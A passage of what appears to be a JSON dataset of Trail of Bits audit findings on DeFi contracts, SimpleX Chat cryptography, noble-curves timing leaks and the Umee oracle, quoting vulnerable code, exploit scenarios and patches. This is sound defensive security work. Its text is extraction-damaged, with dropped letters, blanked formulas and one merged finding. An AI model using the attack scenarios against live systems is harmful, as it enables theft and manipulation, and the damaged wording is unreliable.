vUSD market, decides to close most of her position. After the swap, netPositionSize is slightly less than 1e17. Since a leftover balance of that amount is considered dust (unbeknownst to Alice), her ~1e17 vBTC tokens are sent to the Insurance contract, and her position is fully closed. Recommendations Short term, have the protocol calculate the notional value of netPositionSize by multiplying it by the return value of the indexPrice function. Then have it compare that notional value to the dust thresholds. Note that the dust thresholds must also be expressed in the notional token and that the comparison should not lead to a signicant decrease in a users position. Long term, document this system edge case to inform users that a fraction of their long positions may be donated to the Insurance contract after being reduced.",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: Medium"
        ]
    },
    {
        "title": "8. Problematic use of primitive operations on xed-point integers ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-09-incrementprotocol-securityreview.pdf",
        "description": "The protocols use of primitive operations over xed-point signed and unsigned integers increases the risk of overows and undened behavior. The Increment Protocol uses the PRBMathSD59x18 and PRBMathUD60x18 math libraries to perform operations over 59x18 signed integers and 60x18 unsigned integers, respectively (specically to perform multiplication and division and to nd their absolute values). These libraries aid in calculations that involve percentages or ratios or require decimal precision. When a smart contract system relies on primitive integers and xed-point ones, it should avoid arithmetic operations that involve the use of both types. For example, using x.wadMul(y) to multiply two xed-point integers will provide a dierent result than using x * y . For that reason, great care must be taken to dierentiate between variables that are xed-point and those that are not. Calculations involving xed-point values should use the provided library operations; calculations involving both xed-point and primitive integers should be avoided unless one type is converted to the other. However, a number of multiplication and division operations in the codebase use both primitive and xed-point integers. These include those used to calculate the new time-weighted average prices (TWAPs) of index and market prices (gure 8.1). function _updateTwap () internal { uint256 currentTime = block.timestamp ; int256 timeElapsed = (currentTime - globalPosition.timeOfLastTrade).toInt256(); /* */ priceCumulative1 = priceCumulative0 + price1 * timeElapsed // will overflow in ~3000 years // update cumulative chainlink price feed int256 latestChainlinkPrice = indexPrice(); oracleCumulativeAmount += latestChainlinkPrice * timeElapsed ; // update cumulative market price feed int256 latestMarketPrice = marketPrice().toInt256(); marketCumulativeAmount += latestMarketPrice * timeElapsed ; uint256 timeElapsedSinceBeginningOfPeriod = block.timestamp - globalPosition.timeOfLastTwapUpdate; if (timeElapsedSinceBeginningOfPeriod >= twapFrequency) { /* */ TWAP = (priceCumulative1 - priceCumulative0) / timeElapsed // calculate chainlink twap oracleTwap = ((oracleCumulativeAmount - oracleCumulativeAmountAtBeginningOfPeriod) / timeElapsedSinceBeginningOfPeriod.toInt256()).toInt128() ; // calculate market twap marketTwap = ((marketCumulativeAmount - marketCumulativeAmountAtBeginningOfPeriod) / timeElapsedSinceBeginningOfPeriod.toInt256()).toInt128() ; // reset cumulative amount and timestamp oracleCumulativeAmountAtBeginningOfPeriod = oracleCumulativeAmount; marketCumulativeAmountAtBeginningOfPeriod = marketCumulativeAmount; globalPosition.timeOfLastTwapUpdate = block.timestamp .toUint64(); emit TwapUpdated(oracleTwap, marketTwap); } } Figure 8.1: The _updateTwap function in Perpetual.sol#L1071-1110 Similarly, the _getUnrealizedPnL function in the Perpetual contract calculates the tradingFees value by multiplying a primitive and a xed-point integer (gure 8.2). function _getUnrealizedPnL(LibPerpetual.TraderPosition memory trader) internal view returns ( int256 ) { int256 oraclePrice = indexPrice(); int256 vQuoteVirtualProceeds = int256 (trader.positionSize).wadMul(oraclePrice); int256 tradingFees = (vQuoteVirtualProceeds.abs() * market.out_fee().toInt256()) / CURVE_TRADING_FEE_PRECISION; // @dev: take upper bound on the trading fees // in the case of a LONG, trader.openNotional is negative but vQuoteVirtualProceeds is positive // in the case of a SHORT, trader.openNotional is positive while vQuoteVirtualProceeds is negative return int256 (trader.openNotional) + vQuoteVirtualProceeds - tradingFees; } Figure 8.2: The _getUnrealizedPnL function in Perpetual.sol#L1175-1183 These calculations can lead to unexpected overows or cause the system to enter an undened state. Note that there are other such calculations in the codebase that are not documented in this nding. Recommendations Short term, identify all state variables that are xed-point signed or unsigned integers. Additionally, ensure that all multiplication and division operations involving those state variables use the wadMul and wadDiv functions, respectively. If the Increment Finance team decides against using wadMul or wadDiv in any of those operations (whether to optimize gas or for another reason), it should provide inline documentation explaining that decision.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "9. Liquidations are vulnerable to sandwich attacks ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-09-incrementprotocol-securityreview.pdf",
        "description": "Token swaps that are performed to liquidate a position use a hard-coded zero as the minimum-amount-out value, making them vulnerable to sandwich attacks. The minimum-amount-out value indicates the minimum amount of tokens that a user will receive from a swap. The value is meant to provide protection against pool illiquidity and sandwich attacks. Senders of position and liquidity provision updates are allowed to specify a minimum amount out. However, the minimum-amount-out value used in liquidations of both traders and liquidity providers positions is hard-coded to zero. Figures 9.1 and 9.2 show the functions that perform these liquidations ( _liquidateTrader and _liquidateLp , respectively). function _liquidateTrader( uint256 idx, address liquidatee, uint256 proposedAmount ) internal returns ( int256 pnL, int256 positiveOpenNotional) { (positiveOpenNotional) = int256 (_getTraderPosition(idx, liquidatee).openNotional).abs(); LibPerpetual.Side closeDirection = _getTraderPosition(idx, liquidatee).positionSize >= 0 ? LibPerpetual.Side.Short : LibPerpetual.Side.Long; // (liquidatee, proposedAmount) (, , pnL, ) = perpetuals[idx].changePosition(liquidatee, proposedAmount, 0 , closeDirection, true ); // traders are allowed to reduce their positions partially, but liquidators have to close positions in full if (perpetuals[idx].isTraderPositionOpen(liquidatee)) revert ClearingHouse_LiquidateInsufficientProposedAmount(); return (pnL, positiveOpenNotional); } Figure 9.1: The _liquidateTrader function in ClearingHouse.sol#L522-541 function _liquidateLp ( uint256 idx , address liquidatee , uint256 proposedAmount ) internal returns ( int256 pnL , int256 positiveOpenNotional ) { positiveOpenNotional = _getLpOpenNotional(idx, liquidatee).abs(); // close lp (pnL, , ) = perpetuals[idx].removeLiquidity( liquidatee, _getLpLiquidity(idx, liquidatee), [ uint256 ( 0 ), uint256 ( 0 )] , proposedAmount, 0 , true ); _distributeLpRewards(idx, liquidatee); return (pnL, positiveOpenNotional); } Figure 9.2: The _liquidateLp function in ClearingHouse.sol#L543-562 Without the ability to set a minimum amount out, liquidators are not guaranteed to receive any tokens from the pool during a swap. If a liquidator does not receive the correct amount of tokens, he or she will be unable to close the position, and the transaction will revert; the revert will also prolong the Increment Protocols exposure to debt. Moreover, liquidators will be discouraged from participating in liquidations if they know that they may be subject to sandwich attacks and may lose money in the process. Exploit Scenario Alice, a liquidator, notices that a position is no longer valid and decides to liquidate it. When she sends the transaction, the protocol sets the minimum-amount-out value to zero. Eves sandwich bot identies Alices liquidation as a pure prot opportunity and sandwiches it with transactions. Alices liquidation fails, and the protocol remains in a state of debt. Recommendations Short term, allow liquidators to specify a minimum-amount-out value when liquidating the positions of traders and liquidity providers. Long term, document all cases in which front-running may be possible, along with the implications of front-running for the codebase.",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: High"
        ]
    },
    {
        "title": "10. Accuracy of market and oracle TWAPs is tied to the frequency of user interactions ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-09-incrementprotocol-securityreview.pdf",
        "description": "The oracle and market TWAPs can be updated only during traders and liquidity providers interactions with the protocol; a downtick in user interactions will result in less accurate TWAPs that are more susceptible to manipulation. The accuracy of a TWAP is related to the number of data points available for the average price calculation. The less often prices are logged, the less robust the TWAP becomes. In the case of the Increment Protocol, a TWAP can be updated with each block that contains a trader or liquidity provider interaction. However, during a market slump (i.e., a time of reduced network trac), there will be fewer user interactions and thus fewer price updates. TWAP updates are performed by the Perpetual._updateTwap function, which is called by the internal Perpetual._updateGlobalState function. Other protocols, though, take a dierent approach to keeping markets up to date. The Compound Protocol, for example, has an accrueInterest function that is called upon every user interaction but is also a standalone public function that anyone can call. Recommendations Short term, create a public updateGlobalState function that anyone can call to internally call _updateGlobalState . Long term, create an o-chain worker that can alert the team to periods of perpetual market inactivity, ensuring that the team knows to update the market accordingly. 11. Liquidations of short positions may fail because of insu\u0000cient dust collection Severity: Low Diculty: High Type: Data Validation Finding ID: TOB-INC-11 Target: contracts/Perpetual.sol",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "12. Project dependencies contain vulnerabilities ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-09-incrementprotocol-securityreview.pdf",
        "description": "Although dependency scans did not identify a direct threat to the project under review, yarn audit identied dependencies with known vulnerabilities. Due to the sensitivity of the deployment code and its environment, it is important to ensure that dependencies are not malicious. Problems with dependencies in the JavaScript community could have a signicant eect on the repository under review. The output below details the high-severity vulnerabilities: CVE ID",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: High"
        ]
    },
    {
        "title": "13. Risks associated with oracle outages ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-09-incrementprotocol-securityreview.pdf",
        "description": "Under extreme market conditions, the Chainlink oracle may cease to work as expected, causing unexpected behavior in the Increment Protocol. Such oracle issues have occurred in the past. For example, during the LUNA market crash, the Venus protocol was exploited because Chainlink stopped providing up-to-date prices. The interruption occurred because the price of LUNA dropped below the minimum price ( minAnswer ) allowed by the LUNA / USD price feed on the BNB chain. As a result, all oracle updates reverted. Chainlinks automatic circuit breakers , which pause price feeds during extreme market conditions, could pose similar problems. Note that these kinds of events cannot be tracked on-chain. If a price feed is paused, updatedAt will still be greater than zero, and answeredInRound will still be equal to roundID . Thus, the Increment Finance team should implement an o-chain monitoring solution to detect any anomalous behavior exhibited by Chainlink oracles. The monitoring solution should check for the following conditions and issue alerts if they occur, as they may be indicative of abnormal market events:    An asset price that is approaching the minAnswer or maxAnswer value The suspension of a price feed by an automatic circuit breaker Any large deviations in the price of an asset References    Chainlink: Risk Mitigation Chainlink: Monitoring Data Feeds Chainlink: Circuit Breakers",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "1. X3DH does not apply HKDF to generate secrets ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/SimpleXChat.pdf",
        "description": "The extended triple Die-Hellman (X3DH) key agreement protocol works by computing three separate Die-Hellman computations between pairs of keys. In particular, each party has a longer term private and public key pair as well as a more short-term private and public key pair. The three separate Die-Hellman computations are performed between the various pairs of long term and short term keys. The key agreement is performed this way to simultaneously authenticate each party and provide forward secrecy, which limits the impact of compromised keys. When performing the X3DH key agreement, the nal shared secret is formed by applying HKDF to the concatenation of all three Die-Hellman outputs. The computation is performed this way so that the shared secret depends on the entropy of all three Die-Hellman computations. If the X3DH protocol is being used to generate multiple shared secrets (which is the case for SimpleX), then these secrets should be formed by computing the HKDF over all three Die-Hellman outputs and then splitting the output of HKDF into separate shared secrets. However, as shown in Figure 1.1, the SimpleX implementation of X3DH uses each of the three Die-Hellman outputs as separate secrets for the Double Ratchet protocol, rather than inputting them into HKDF and splitting the output. x3dhSnd :: DhAlgorithm a => PrivateKey a -> PrivateKey a -> E2ERatchetParams a -> RatchetInitParams x3dhSnd spk1 spk2 ( E2ERatchetParams _ rk1 rk2) = x3dh (publicKey spk1, rk1) (dh' rk1 spk2) (dh' rk2 spk1) (dh' rk2 spk2) x3dhRcv :: DhAlgorithm a => PrivateKey a -> PrivateKey a -> E2ERatchetParams a -> RatchetInitParams x3dhRcv rpk1 rpk2 ( E2ERatchetParams _ sk1 sk2) = x3dh (sk1, publicKey rpk1) (dh' sk2 rpk1) (dh' sk1 rpk2) (dh' sk2 rpk2) x3dh :: DhAlgorithm a => ( PublicKey a, PublicKey a) -> DhSecret a -> DhSecret a -> DhSecret a -> RatchetInitParams x3dh (sk1, rk1) dh1 dh2 dh3 = RatchetInitParams {assocData, ratchetKey = RatchetKey sk, sndHK = Key hk, rcvNextHK = Key nhk} where assocData = Str $ pubKeyBytes sk1 <> pubKeyBytes rk1 (hk, rest) = B .splitAt 32 $ dhBytes' dh1 <> dhBytes' dh2 <> dhBytes' dh3 (nhk, sk) = B .splitAt 32 rest Figure 1.1: simplexmq/src/Simplex/Messaging/Crypto/Ratchet.hs#L98-L112 Performing the X3DH protocol this way will increase the impact of compromised keys and have implications for the theoretical forward secrecy of the protocol. To see why this is the case, consider what happens if a single key pair, (sk2 , spk2) , is compromised. In the current implementation, if an attacker compromises this key pair, then they can immediately recover the header key, hk , and the ratchet key, sk . However, if this were implemented by rst computing the HKDF over all three Die-Hellman outputs, then the attacker would not be able to recover these keys without also compromising another key pair. Note that SimpleX does not perform X3DH with long-term identity keys, as the SimpleX protocol does not rely on long-term keys to identify client devices. Therefore, the impact of compromising a key will be less severe, as it will aect only the secrets of the current session. Exploit Scenario An attacker is able to compromise a single X3DH key pair of a client using SimpleX chat. Because of how the X3DH is performed, they are able to then compromise the clients header key and ratchet key and can decrypt some of their messages. Recommendations Short term, adjust the X3DH implementation so that HKDF is computed over the concatenation of dh1 , dh2 , and dh3 before obtaining the ratchet key and header keys.",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: High"
        ]
    },
    {
        "title": "2. The pad function is incorrect for long messages ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/SimpleXChat.pdf",
        "description": "The pad function from the Simplex.Messaging.Crypto module uses the fromIntegral function, resulting in an integer overow bug that leads to incorrect length encoding for messages longer than 65535 bytes (Figure 2.1). At the moment, the function appears to be called only with messages that are less than that; however, due to the general nature of the module, there is a risk of using a pad with longer messages as the message length assumption is not documented. pad :: ByteString -> Int -> Either CryptoError ByteString pad msg paddedLen | padLen >= 0 = Right $ encodeWord16 (fromIntegral len) <> msg <> B .replicate padLen '#' | otherwise = Left CryptoLargeMsgError where len = B .length msg padLen = paddedLen - len - 2 Figure 2.1: simplexmq/src/Simplex/Messaging/Crypto.hs#L805-L811 Exploit Scenario The pad function is used on messages longer than 65535 bytes, introducing a security vulnerability. Recommendations Short term, change the pad function to check the message length if it ts into 16 bits and return CryptoLargeMsgError if it does not. Long term, write unit tests for the pad function. Avoid using fromIntegral to cast to smaller integer types; instead, create a new function that will safely cast to smaller types that returns Maybe .",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: High"
        ]
    },
    {
        "title": "3. The unPad function throws exception for short messages ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/SimpleXChat.pdf",
        "description": "The unPad function throws an undocumented exception when the input is empty or a single byte. This is due to the decodeWord16 function, which throws an IOException if the input is not exactly two bytes. The unPad function does not appear to be used on such short inputs in the current code. unPad :: ByteString -> Either CryptoError ByteString unPad padded | B .length rest >= len = Right $ B .take len rest | otherwise = Left CryptoLargeMsgError where ( lenWrd , rest) = B .splitAt 2 padded len = fromIntegral $ decodeWord16 lenWrd Figure 3.1: simplexmq/src/Simplex/Messaging/Crypto.hs#L813-L819 Exploit Scenario The unPad function takes a user-controlled input and throws an exception that is not handled in a thread that is critical to the functioning of the protocol, resulting in a denial of service. Recommendations Short term, validate the length of the input passed to the unPad function and return an error if the input is too short. Long term, write unit tests for the unPad function to ensure the validation works as intended.",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: High"
        ]
    },
    {
        "title": "4. Key material resides in unpinned memory and is not cleared after its lifetime ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/SimpleXChat.pdf",
        "description": "The key material generated and processed by the SimpleXMQ library resides in unpinned memory, and the data is not cleared out from the memory as soon as it is no longer used. The key material will stay on the Haskell heap until it is garbage collected and overwritten by other data. Combined with unpinned memory pages where the Haskells heap is allocated, this creates a risk of paging out unencrypted memory pages with the key material to disk. Because the memory management is abstracted away by the language, the manual memory management required to pin and zero-out the memory in garbage-collected language as Haskell is challenging. This issue does not concern the communication security; only device security is aected. Exploit Scenario The unencrypted key material is paged out to the hard drive, where it is exposed and can be stolen by an attacker. Recommendations Short term, investigate the use of mlock/mlockall on supported platforms to prevent memory pages that contain key material to be paged out. Explicitly zero out the key material as soon as it is no longer needed. Long term, document the key material memory management and the threat model around it.",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: High"
        ]
    },
    {
        "title": "1. Timing issues ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-01-ryanshea-noblecurveslibrary-securityreview.pdf",
        "description": "The library provides a scalar multiplication routine that aims to keep the number of BigInteger operations constant, in order to be (close to) constant-time. However, there are some locations in the implementation where timing dierences can cause issues:    Pre-computed point look-up during scalar multiplication (gure 1.1) Second part of signature generation Tonelli-Shanks square root computation // Check if we're onto Zero point. // Add random point inside current window to f. const offset1 = offset; const offset2 = offset + Math .abs(wbits) - 1 ; // -1 because we skip zero const cond1 = window % 2 !== 0 ; const cond2 = wbits < 0 ; if (wbits === 0 ) { // The most important part for const-time getPublicKey f = f.add(constTimeNegate(cond1, precomputes[offset1])); } else { p = p.add(constTimeNegate(cond2, precomputes[offset2])); } Figure 1.1: Pre-computed point lookup during scalar multiplication ( noble-curves/src/abstract/curve.ts:117128 ) The scalar multiplication routine comprises a loop, part of which is shown in Figure 1.1. Each iteration adds a selected pre-computed point to the accumulator p (or to the dummy accumulator f if relevant scalar bits are all zero). However, the array access to select the appropriate pre-computed point is not constant-time. Figure 1.2 shows how the implementation computes the second half of an ECDSA signature. 14 noble-curves Security Assessment const s = modN(ik * modN(m + modN(d * r))); // s = k^-1(m + rd) mod n Figure 1.2: Generation of the second part of the signature ( noble-curves/src/abstract/weierstrass.ts:988 ) First, the private key is multiplied by the rst half of the signature and reduced modulo the group order. Next, the message digest is added and the result is again reduced modulo the group order. If the modulo operation is not constant-time, and if an attacker can detect this timing dierence, they can perform a lattice attack to recover the signing key. The details of this attack are described in the TCHES 2019 article by Ryan . Note that the article does not show that this timing dierence attack can be practically exploited, but instead mounts a cache-timing attack to exploit it. FpSqrt is a function that computes square roots of quadratic residues over  . Based on   , this function chooses one of several sub-algorithms, including  the value of Tonelli-Shanks. Some of these algorithms are constant-time with respect to , but some are not. In particular, the implementation of the Tonelli-Shanks algorithm has a high degree of timing variability. The FpSqrt function is used to decode compressed point representations, so it can inuence timing when handling potentially sensitive or adversarial data. Most texts consider Tonelli-Shanks the fallback algorithm when a faster or simpler algorithm is unavailable. However, Tonelli-Shanks can be used for any prime modulus Further, Tonelli-Shanks can be made constant time for a given value of  .  . Timing leakage threats can be reduced by modifying the Tonelli-Shanks code to run in constant time (see here ), and making the constant-time implementation the default square root algorithm. Special-case algorithms can be broken out into separate functions (whether constant- or variable-time), for use when the modulus is known to work, or timing attacks are not a concern. Exploit Scenario An attacker interacts with a user of the library and measures the time it takes to execute signature generation or ECDH key exchange. In the case of static ECDH, the attacker may provide dierent public keys to be multiplied with the static private key of the library user. In the case of ECDSA, the attacker may get the user to repeatedly sign the same message, which results in scalar multiplications on the base point using the same deterministically generated nonce. The attacker can subsequently average the obtained execution times for operations with the same input to gain more precise timing estimates. Then, the attacker uses the obtained execution times to mount a timing attack: 15 noble-curves Security Assessment   In the case of ECDSA, the attacker may attempt to mount the attack from the TCHES 2019 article by Ryan . However, it is unknown whether this attack will work in practice when based purely on timing. In the case of static ECDH, the attacker may attempt to mount a recursive attack, similar to the attacks described in the Cardis 1998 article by Dhem et al. or the JoCE 2013 article by Danger et al. Note that the timing dierences caused by the precomputed point look-up may not be sucient to mount such a timing attack. The attacker would need to nd other timing dierences, such as dierences in the point addition routines based on one of the input points. The fact that the library uses a complete addition formula increases the diculty, but there could still be timing dierences caused by the underlying big integer arithmetic. Determining whether such timing attacks are practically applicable to the library (and how many executions they would need) requires a large number of measurements on a dedicated benchmarking system, which was not done as part of this engagement. Recommendations Short term, consider adding scalar randomization to primitives where the same private scalar can be used multiple times, such as ECDH and deterministic ECDSA. To mitigate the attack from the TCHES 2019 article by Ryan , consider either blinding the private scalar in the signature computation or removing the modular reduction of  =  (  *  (  +  *  )) , i.e.,     . Long term, ensure that all low-level operations are constant-time. References    Return of the Hidden Number Problem, Ryan, TCHES 2019 A Practical Implementation of the Timing Attack, Dhem et al., Cardis 1998 A synthesis of side-channel attacks on elliptic curve cryptography in smart-cards, Danger et al., JoCE 2013 16 noble-curves Security Assessment",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: Undetermined"
        ]
    },
    {
        "title": "1. Integer overow in Peggo's deploy-erc20-raw command ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Umee.pdf",
        "description": "The denom-decimals argument of the deploy-erc20-raw command (in the deployERC20RawCmd function) may experience an integer overow. The argument is rst parsed into a value of the int type by the strconv.Atoi function and then cast to a value of the uint8 type (gure 1.1). If the denom-decimals argument with which deploy-erc20-raw is invoked is a negative value or a value that is too large, the casting operation will cause an overow; however, the user will not receive an error, and the execution will proceed with the overow value. func deployERC20RawCmd() *cobra.Command { return &cobra.Command{ Use: \"deploy-erc20-raw [gravity-addr] [denom-base] [denom-name] [denom-symbol] [denom-decimals]\" , /* (...) */ , RunE: func (cmd *cobra.Command, args [] string ) error { denomDecimals, err := strconv.Atoi(args[ 4 ]) if err != nil { return fmt.Errorf( \"invalid denom decimals: %w\" , err) } tx, err := gravityContract.DeployERC20(auth, denomBase, denomName, denomSymbol, uint8 (denomDecimals) ) Figure 1.1: peggo/cmd/peggo/bridge.go#L348-L353 We identied this issue by running CodeQL's IncorrectIntegerConversionQuery.ql query. Recommendations Short term, x the integer overow in Peggos deployERC20RawCmd function by using the strconv.ParseUint function to parse the denom-decimals argument. To do this, use the patch in gure 1.2. diff --git a/cmd/peggo/bridge.go b/cmd/peggo/bridge.go index 49aabc5..4b3bc6a 100644 --- a/cmd/peggo/bridge.go +++ b/cmd/peggo/bridge.go @@ -345,7 +345,7 @@ network starting.`, - + denomBase := args[ 1 ] denomName := args[ 2 ] denomSymbol := args[ 3 ] denomDecimals, err := strconv.Atoi(args[ 4 ]) denomDecimals, err := strconv.ParseUint(args[ 4 ], 10 , 8 ) if err != nil { return fmt.Errorf( \"invalid denom decimals: %w\" , err) } Figure 1.2: A patch for the integer overow issue in Peggo's deploy-erc20-raw command Long term, integrate CodeQL into the CI/CD pipeline to nd similar issues in the future.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "2. Rounding of the standard deviation value may deprive voters of rewards ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Umee.pdf",
        "description": "The ExchangeRateBallot.StandardDeviation function calculates the standard deviation of the exchange rates submitted by voters. To do this, it converts the variance into a oat, prints its square root to a string, and parses it into a Dec value (gure 2.1). This logic rounds down the standard deviation value, which is likely unexpected behavior; if the exchange rate is within the reward spread value, voters may not receive the rewards they are owed. The rounding operation is performed by the fmt.Sprintf(\"%f\", floatNum) function, which, as shown in Appendix C , may cut o decimal places from the square root value. // StandardDeviation returns the standard deviation by the power of the ExchangeRateVote. func (pb ExchangeRateBallot) StandardDeviation() (sdk.Dec, error ) { // (...) variance := sum.QuoInt64( int64 ( len (pb))) floatNum, err := strconv.ParseFloat(variance.String(), 64 ) if err != nil { /* (...) */ } floatNum = math.Sqrt(floatNum) standardDeviation, err := sdk.NewDecFromStr(fmt.Sprintf( \"%f\" , floatNum)) if err != nil { /* (...) */ } return standardDeviation, nil } Figure 2.1: Inaccurate oat conversions ( umee/x/oracle/types/ballot.go#L89-L97 ) Exploit Scenario A voter reports a price that should be within the reward spread. However, because the standard deviation value is rounded, the price is not within the reward spread, and the voter does not receive a reward. Recommendations Short term, have the ExchangeRateBallot.StandardDeviation function use the Dec.ApproxSqrt method to calculate the standard deviation instead of parsing the variance into a oat, calculating the square root, and parsing the formatted oat back into a value of the Dec type. That way, users who vote for exchange rates close to the correct reward spread will receive the rewards they are owed. Figure 2.2 shows a patch for this issue. diff --git a/x/oracle/types/ballot.go b/x/oracle/types/ballot.go index 6b201c2..9f6b579 100644 --- a/x/oracle/types/ballot.go +++ b/x/oracle/types/ballot.go @@ -1,12 +1,8 @@ package types import ( - - - - - + ) \"fmt\" \"math\" \"sort\" \"strconv\" sdk \"github.com/cosmos/cosmos-sdk/types\" \"sort\" // VoteForTally is a convenience wrapper to reduce redundant lookup cost. @@ - 88 , 13 + 84 , 8 @@ func (pb ExchangeRateBallot) StandardDeviation() (sdk.Dec, error ) { - - - - + - - variance := sum.QuoInt64( int64 ( len (pb))) floatNum, err := strconv.ParseFloat(variance.String(), 64 ) if err != nil { return sdk.ZeroDec(), err } standardDeviation, err := variance.ApproxSqrt() floatNum = math.Sqrt(floatNum) standardDeviation, err := sdk.NewDecFromStr(fmt.Sprintf( \"%f\" , floatNum)) if err != nil { return sdk.ZeroDec(), err } diff --git a/x/oracle/types/ballot_test.go b/x/oracle/types/ballot_test.go index 0cd09d8..0dd1f1a 100644 --- a/x/oracle/types/ballot_test.go +++ b/x/oracle/types/ballot_test.go @@ - 177 , 21 + 177 , 21 @@ func TestPBStandardDeviation(t *testing.T) { - + - + }, { }, { [] float64 { 1.0 , 2.0 , 10.0 , 100000.0 }, [] int64 { 1 , 1 , 100 , 1 }, [] bool { true , true , true , true }, sdk.NewDecWithPrec( 4999500036300 , OracleDecPrecision), sdk.MustNewDecFromStr( \"49995.000362536252310906\" ), // Adding fake validator doesn't change outcome [] float64 { 1.0 , 2.0 , 10.0 , 100000.0 , 10000000000 }, [] int64 { 1 , 1 , 100 , 1 , 10000 }, [] bool { true , true , true , true , false }, sdk.NewDecWithPrec( 447213595075100600 , OracleDecPrecision), sdk.MustNewDecFromStr( \"4472135950.751005519905537611\" ), // Tie votes [] float64 { 1.0 , 2.0 , 3.0 , 4.0 }, [] int64 { 1 , 100 , 100 , 1 }, - + [] bool { true , true , true , true }, sdk.NewDecWithPrec( 122474500 , OracleDecPrecision), sdk.MustNewDecFromStr( \"1.224744871391589049\" ), }, { // No votes Figure 2.2: A patch for this issue",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: High"
        ]
    },
    {
        "title": "3. Vulnerabilities in exchange rate commitment scheme ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Umee.pdf",
        "description": "The Umee oracle implements a commitment scheme in which users vote on new exchange rates by submitting \"pre-vote\" and \"vote\" messages. However, vulnerabilities in this scheme could allow an attacker to (1) predict the prices to which other voters have committed and (2) send two prices for an asset in a pre-vote message hash and then submit one of the prices in the vote message. (Note that predicting other prices would likely require the attacker to make some correct guesses about those prices.) The rst issue is that the random salt used in the scheme is too short. The salt is generated as two random bytes (gure 3.1) and is later hex-encoded and limited to four bytes (gure 3.2). As a result, an attacker could pre-compute the pre-vote commitment hash of every salt value (and thus the expected exchange rate), eectively violating the hiding property of the scheme. salt, err := GenerateSalt( 2 ) Figure 3.1: The salt-generation code ( umee/price-feeder/oracle/oracle.go#358 ) if len (msg.Salt) > 4 || len (msg.Salt) < 1 { return sdkerrors.Wrap(ErrInvalidSaltLength, \"salt length must be [1, 4]\" ) } Figure 3.2: The salt-validation logic ( umee/x/oracle/types/msgs.go#148150 ) The second issue is the lack of proper salt validation, which would guarantee sucient domain separation between a random salt and the exchange rate when the commitment hash is calculated. The domain separator string consists of a colon character, as shown in gure 3.3. However, there is no verication of whether the salt is a hex-encoded string or whether it contains the separator character; only the length of the salt is validated. This bug could allow an attacker to reveal an exchange rate other than the one the attacker had committed to, violating the binding property of the scheme. func GetAggregateVoteHash(salt string , exchangeRatesStr string , voter sdk.ValAddress) AggregateVoteHash { hash := tmhash.NewTruncated() sourceStr := fmt.Sprintf( \"%s:%s:%s\" , salt, exchangeRatesStr, voter.String() ) Figure 3.3: The generation of a commitment hash ( umee/x/oracle/types/hash.go#2325 ) The last vulnerability in the scheme is the insucient validation of exchange rate strings: the strings undergo unnecessary trimming, and the code checks only that len(denomAmountStr) is less than two (gure 3.4), rather than performing a stricter check to conrm that it is not equal to two. This could allow an attacker to exploit the second bug described in this nding. func ParseExchangeRateTuples(tuplesStr string ) (ExchangeRateTuples, error ) { tuplesStr = strings.TrimSpace(tuplesStr) if len (tuplesStr) == 0 { return nil , nil } tupleStrs := strings.Split(tuplesStr, \",\" ) // (...) for i, tupleStr := range tupleStrs { denomAmountStr := strings.Split(tupleStr, \":\" ) if len (denomAmountStr) < 2 { return nil , fmt.Errorf( \"invalid exchange rate %s\" , tupleStr) } } // (...) } Figure 3.4: The code that parses exchange rates ( umee/x/oracle/types/vote.go#7286 ) Exploit Scenario The maximum salt length of two is increased. During a subsequent pre-voting period, a malicious validator submits the following commitment hash: sha256(\"whatever:UMEE:123:UMEE:456,USDC:789:addr\") . (Note that  represents a normal whitespace character.) Then, during the voting period, the attacker waits for all other validators to reveal their exchange rates and salts and then chooses the UMEE price that he will reveal ( 123 or 456 ). In this way, the attacker can manipulate the exchange rate to his advantage. If the attacker chooses to reveal a price of 123 , the following will occur: 1. The salt will be set to whatever . 2. The attacker will submit an exchange rate string of UMEE:123:UMEE:456,USDC:789 . 3. The value will be hashed as sha256( whatever : UMEE:123:UMEE:456,USDC:789 : addr) . 4. The exchange rate will then be parsed as 123/789 (UMEE/USDC). Note that  UMEE = 456 (with its leading whitespace character) will be ignored. This is because of the insucient validation of exchange rate strings (as described above) and the fact that only the rst and second items of denomAmountStr are used. (See the screenshot in Appendix D). If the attacker chooses to reveal a price of 456 , the following will occur: 1. The salt will be set to whatever:UMEE:123 . 2. The exchange rate string will be set to UMEE:456,USDC:789 . 3. The value will be hashed as sha256( whatever:UMEE:123 : UMEE:456,USDC:789 : addr) . 4. Because exchange rate strings undergo space trimming, the exchange rate will be parsed as 456/789 (UMEE/USDC). Recommendations Short term, take the following steps:    Increase the salt length to prevent brute-force attacks. To ensure a security level of X bits, use salts of 2*X random bits. For example, for a 128-bit security level, use salts of 256 bits (32 bytes). Ensure domain separation by implementing validation of a salts format and accepting only hex-encoded strings. Implement stricter validation of exchange rates by 